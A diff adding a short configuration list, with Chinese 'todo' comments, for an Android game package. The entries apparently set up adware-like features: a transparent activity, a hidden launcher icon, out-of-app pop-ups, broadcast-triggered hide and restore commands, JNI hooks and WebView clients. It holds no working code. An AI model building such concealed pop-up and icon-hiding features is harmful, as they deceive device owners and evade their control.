@@ -1,0 +1,20 @@
+// 这里面的信息都需要修改
+fruit['com.game.picut', 'com.fruitss.cutse.gamesz',  # 包名 // todo
+               'com.demo.path.DemoTransparentActivity',# 透明activity // todo
+               'az/MBroadcastRe',  #  广播 // todo
+               '','com.game.picut.MainActivity',  # 隐藏图标 other1","main2 // todo
+               'az/k.b.b/a', '"a0"',  # jni路径及函数 // todo
+               '/fileName',# 外弹文件开关名 // todo
+               '"key"',# 广播接收key // todo
+               '"qywu"',  # 恢复 // todo
+               '"hide"',  # 隐藏 // todo
+               '"waitan"']  # 外弹 // todo
+
+ban['com.game.picut', 'com.fruitss.cutse.gamesz',  # 包名 // todo
+                  'az/k.b.b/a', // todo
+                   '"k.b.b"','"c"', '"d"', // todo
+                  'az/MHandler',  # hander // todo
+                  'az/MWebViewClient',  # wvcClass WebViewClient // todo
+                  'az/MWebChromeClient',  # WccClass WebChormeClient // todo
+                  '/fileName']#文件开关 // todo
+钟哥，给一下H5的So呢，包名：com.fruitss.cutse.gamesz                  // todo
